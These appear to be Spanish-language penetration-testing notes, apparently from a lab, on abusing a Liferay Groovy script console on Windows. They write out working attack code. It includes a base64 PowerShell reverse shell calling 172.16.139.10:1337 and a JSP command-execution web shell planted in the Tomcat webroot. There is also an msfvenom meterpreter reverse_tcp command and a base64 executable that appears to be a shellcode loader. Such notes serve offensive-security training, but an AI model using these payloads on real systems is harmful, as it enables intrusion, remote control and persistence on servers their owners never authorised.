def cmd = """powershell.exe -c echo "ZABvACAAewAKACAAIAAgACAAIwAgAEQAZQBsAGEAeQAgAGIAZQBmAG8AcgBlACAAZQBzAHQAYQBiAGwAaQBzAGgAaQBuAGcAIABuAGUAdAB3AG8AcgBrACAAYwBvAG4AbgBlAGMAdABpAG8AbgAsACAAYQBuAGQAIABiAGUAdAB3AGUAZQBuACAAcgBlAHQAcgBpAGUAcwAKACAAIAAgACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAKAAoAIAAgACAAIAAjACAAQwBvAG4AbgBlAGMAdAAgAHQAbwAgAEMAMgAKACAAIAAgACAAdAByAHkAewAKACAAIAAgACAAIAAgACAAIAAkAFQAQwBQAEMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA3ADIALgAxADYALgAxADMAOQAuADEAMAAnACwAIAAxADMAMwA3ACkACgAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AH0ACgB9ACAAdQBuAHQAaQBsACAAKAAkAFQAQwBQAEMAbABpAGUAbgB0AC4AQwBvAG4AbgBlAGMAdABlAGQAKQAKACQATgBlAHQAdwBvAHIAawBTAHQAcgBlAGEAbQAgAD0AIAAkAFQAQwBQAEMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApAAoAJABTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAE4AZQB0AHcAbwByAGsAUwB0AHIAZQBhAG0AKQAKAGYAdQBuAGMAdABpAG8AbgAgAFcAcgBpAHQAZQBUAG8AUwB0AHIAZQBhAG0AIAAoACQAUwB0AHIAaQBuAGcAKQAgAHsACgAgACAAIAAgAFsAYgB5AHQAZQBbAF0AXQAkAHMAYwByAGkAcAB0ADoAQgB1AGYAZgBlAHIAIAA9ACAAMAAuAC4AJABUAEMAUABDAGwAaQBlAG4AdAAuAFIAZQBjAGUAaQB2AGUAQgB1AGYAZgBlAHIAUwBpAHoAZQAgAHwAIAAlACAAewAwAH0ACgAgACAAIAAgACQAUwB0AHIAZQBhAG0AVwByAGkAdABlAHIALgBXAHIAaQB0AGUAKAAkAFMAdAByAGkAbgBnACAAKwAgACcAUwBIAEUATABMAD4AIAAnACkACgAgACAAIAAgACQAUwB0AHIAZQBhAG0AVwByAGkAdABlAHIALgBGAGwAdQBzAGgAKAApAAoAfQAKAFcAcgBpAHQAZQBUAG8AUwB0AHIAZQBhAG0AIAAnACcACgB3AGgAaQBsAGUAKAAoACQAQgB5AHQAZQBzAFIAZQBhAGQAIAA9ACAAJABOAGUAdAB3AG8AcgBrAFMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAQgB1AGYAZgBlAHIALAAgADAALAAgACQAQgB1AGYAZgBlAHIALgBMAGUAbgBnAHQAaAApACkAIAAtAGcAdAAgADAAKQAgAHsACgAgACAAIAAgACQAQwBvAG0AbQBhAG4AZAAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4ACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAQgB1AGYAZgBlAHIALAAgADAALAAgACQAQgB5AHQAZQBzAFIAZQBhAGQAIAAtACAAMQApAAoAIAAgACAAIAAkAE8AdQB0AHAAdQB0ACAAPQAgAHQAcgB5ACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAQwBvAG0AbQBhAG4AZAAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAKACAAIAAgACAAIAAgACAAIAB9ACAAYwBhAHQAYwBoACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAXwAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAFcAcgBpAHQAZQBUAG8AUwB0AHIAZQBhAG0AIAAoACQATwB1AHQAcAB1AHQAKQAKAH0ACgAkAFMAdAByAGUAYQBtAFcAcgBpAHQAZQByAC4AQwBsAG8AcwBlACgAKQAKAA==" > data.txt """
def proc = cmd.execute()
def sout = new StringBuffer(), serr = new StringBuffer()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(10000)
println "Errores de red: " + serr
println "Salida: " + sout ahora para decodearlo y colocarlo dentro de un shwll.ps1 en c:\programdata?
```


```powershell
// Escapamos el $ con \ para que Groovy no lo confunda con una variable suya
def cmd = """powershell.exe -c \$b64 = Get-Content "data.txt"; [IO.File]::WriteAllBytes("C:\\programdata\\shell.ps1", [Convert]::FromBase64String(\$b64))"""

def proc = cmd.execute()
def sout = new StringBuffer(), serr = new StringBuffer()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(10000)

println "Errores: " + serr
println "Salida: " + sout
```

este funciono
```powershell
import java.util.Base64

// Tu base64 original
def base64String = 'ZABvACAAewAKACAAIAAgACAAIwAgAEQAZQBsAGEAeQAgAGIAZQBmAG8AcgBlACAAZQBzAHQAYQBiAGwAaQBzAGgAaQBuAGcAIABuAGUAdAB3AG8AcgBrACAAYwBvAG4AbgBlAGMAdABpAG8AbgAsACAAYQBuAGQAIABiAGUAdAB3AGUAZQBuACAAcgBlAHQAcgBpAGUAcwAKACAAIAAgACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAKAAoAIAAgACAAIAAjACAAQwBvAG4AbgBlAGMAdAAgAHQAbwAgAEMAMgAKACAAIAAgACAAdAByAHkAewAKACAAIAAgACAAIAAgACAAIAAkAFQAQwBQAEMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA3ADIALgAxADYALgAxADMAOQAuADEAMAAnACwAIAAxADMAMwA3ACkACgAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AH0ACgB9ACAAdQBuAHQAaQBsACAAKAAkAFQAQwBQAEMAbABpAGUAbgB0AC4AQwBvAG4AbgBlAGMAdABlAGQAKQAKACQATgBlAHQAdwBvAHIAawBTAHQAcgBlAGEAbQAgAD0AIAAkAFQAQwBQAEMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApAAoAJABTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAE4AZQB0AHcAbwByAGsAUwB0AHIAZQBhAG0AKQAKAGYAdQBuAGMAdABpAG8AbgAgAFcAcgBpAHQAZQBUAG8AUwB0AHIAZQBhAG0AIAAoACQAUwB0AHIAaQBuAGcAKQAgAHsACgAgACAAIAAgAFsAYgB5AHQAZQBbAF0AXQAkAHMAYwByAGkAcAB0ADoAQgB1AGYAZgBlAHIAIAA9ACAAMAAuAC4AJABUAEMAUABDAGwAaQBlAG4AdAAuAFIAZQBjAGUAaQB2AGUAQgB1AGYAZgBlAHIAUwBpAHoAZQAgAHwAIAAlACAAewAwAH0ACgAgACAAIAAgACQAUwB0AHIAZQBhAG0AVwByAGkAdABlAHIALgBXAHIAaQB0AGUAKAAkAFMAdAByAGkAbgBnACAAKwAgACcAUwBIAEUATABMAD4AIAAnACkACgAgACAAIAAgACQAUwB0AHIAZQBhAG0AVwByAGkAdABlAHIALgBGAGwAdQBzAGgAKAApAAoAfQAKAFcAcgBpAHQAZQBUAG8AUwB0AHIAZQBhAG0AIAAnACcACgB3AGgAaQBsAGUAKAAoACQAQgB5AHQAZQBzAFIAZQBhAGQAIAA9ACAAJABOAGUAdAB3AG8AcgBrAFMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAQgB1AGYAZgBlAHIALAAgADAALAAgACQAQgB1AGYAZgBlAHIALgBMAGUAbgBnAHQAaAApACkAIAAtAGcAdAAgADAAKQAgAHsACgAgACAAIAAgACQAQwBvAG0AbQBhAG4AZAAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4ACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAQgB1AGYAZgBlAHIALAAgADAALAAgACQAQgB5AHQAZQBzAFIAZQBhAGQAIAAtACAAMQApAAoAIAAgACAAIAAkAE8AdQB0AHAAdQB0ACAAPQAgAHQAcgB5ACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAQwBvAG0AbQBhAG4AZAAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAKACAAIAAgACAAIAAgACAAIAB9ACAAYwBhAHQAYwBoACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAXwAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAFcAcgBpAHQAZQBUAG8AUwB0AHIAZQBhAG0AIAAoACQATwB1AHQAcAB1AHQAKQAKAH0ACgAkAFMAdAByAGUAYQBtAFcAcgBpAHQAZQByAC4AQwBsAG8AcwBlACgAKQAKAA==' 

// 1. Decodificamos a bytes
byte[] decodedBytes = Base64.getDecoder().decode(base64String)

// 2. IMPORTANTE: Convertimos de UTF-16LE a un String normal de Java/Groovy
// Esto elimina los espacios (bytes nulos) que estás viendo
def scriptLimpio = new String(decodedBytes, "UTF-16LE")

// 3. Ahora guardamos el script ya limpio
def outputPath = "C:\\temp\\shell1.ps1"
new File(outputPath).write(scriptLimpio, "UTF-8")

println "Archivo guardado sin espacios en: " + outputPath
```

![[Pasted image 20260121222046.png]]

shell.jsp
```bash
import java.util.Base64

// Tu base64 (que es texto plano estándar)
def base64String = 'PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT4KPCUKLy8KLy8gSlNQX0tJVAovLwovLyBjbWQuanNwID0gQ29tbWFuZCBFeGVjdXRpb24gKHVuaXgpCi8vCi8vIGJ5OiBVbmtub3duCi8vIG1vZGlmaWVkOiAyNy8wNi8yMDAzCi8vCiU+CjxIVE1MPjxCT0RZPgo8Rk9STSBNRVRIT0Q9IkdFVCIgTkFNRT0ibXlmb3JtIiBBQ1RJT049IiI+CjxJTlBVVCBUWVBFPSJ0ZXh0IiBOQU1FPSJjbWQiPgo8SU5QVVQgVFlQRT0ic3VibWl0IiBWQUxVRT0iU2VuZCI+CjwvRk9STT4KPHByZT4KPCUKaWYgKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSAhPSBudWxsKSB7CiAgICAgICAgb3V0LnByaW50bG4oIkNvbW1hbmQ6ICIgKyByZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikgKyAiPEJSPiIpOwogICAgICAgIFByb2Nlc3MgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsKICAgICAgICBPdXRwdXRTdHJlYW0gb3MgPSBwLmdldE91dHB1dFN0cmVhbSgpOwogICAgICAgIElucHV0U3RyZWFtIGluID0gcC5nZXRJbnB1dFN0cmVhbSgpOwogICAgICAgIERhdGFJbnB1dFN0cmVhbSBkaXMgPSBuZXcgRGF0YUlucHV0U3RyZWFtKGluKTsKICAgICAgICBTdHJpbmcgZGlzciA9IGRpcy5yZWFkTGluZSgpOwogICAgICAgIHdoaWxlICggZGlzciAhPSBudWxsICkgewogICAgICAgICAgICAgICAgb3V0LnByaW50bG4oZGlzcik7IAogICAgICAgICAgICAgICAgZGlzciA9IGRpcy5yZWFkTGluZSgpOyAKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CiU+CjwvcHJlPgo8L0JPRFk+PC9IVE1MPgoK'

// 1. Decodificamos los bytes
byte[] decodedBytes = Base64.getDecoder().decode(base64String)

// 2. Lo convertimos a String usando UTF-8 (esto evita los espacios nulos del UTF-16)
def scriptFinal = new String(decodedBytes, "UTF-8")

// 3. Ruta de destino en el Tomcat de Liferay
def outputPath = "C:\\Liferay\\liferay-ce-portal-7.4.3.43-ga43\\tomcat-9.0.56\\webapps\\ROOT\\html\\shell.jsp"

// 4. Escribimos el archivo
new File(outputPath).write(scriptFinal, "UTF-8")

println "[+] Shell plantada con éxito en: " + outputPath
```

rutas print

```bash
// 1. Ver dónde está instalado el Portal println "Liferay Home: " + System.getProperty("liferay.home") // 2. Ver el directorio de trabajo de Tomcat println "Tomcat Base: " + System.getProperty("catalina.base") // 3. Ver dónde está la carpeta temporal (útil si nada funciona) println "Temp Dir: " + System.getProperty("java.io.tmpdir") // 4. Listar las raíces de los discos para confirmar letras def roots = java.io.File.listRoots() roots.each { println "Disco disponible: ${it}" }
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.139.10 LPORT=443 -f exe -o revv.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: revv.exe
```


subo revv.exe

```bash
import java.util.Base64

// Tu base64 original del EXE
def base64String = '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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA